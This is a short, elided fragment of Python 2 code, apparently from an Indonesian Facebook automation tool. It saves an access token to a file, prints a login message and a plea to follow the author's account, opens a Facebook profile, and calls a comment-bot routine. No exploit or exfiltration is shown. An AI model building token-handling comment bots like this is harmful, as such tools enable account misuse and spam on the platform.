...
def tokenz():
	...
	try:
		...
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;97m JANGAN LUPA FOLLOW AKUN GW YAH')
		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Berhasil Masuk'
		os.system('xdg-open  https://www.facebook.com/100052292505058')
		bot_komen()
	except KeyError:
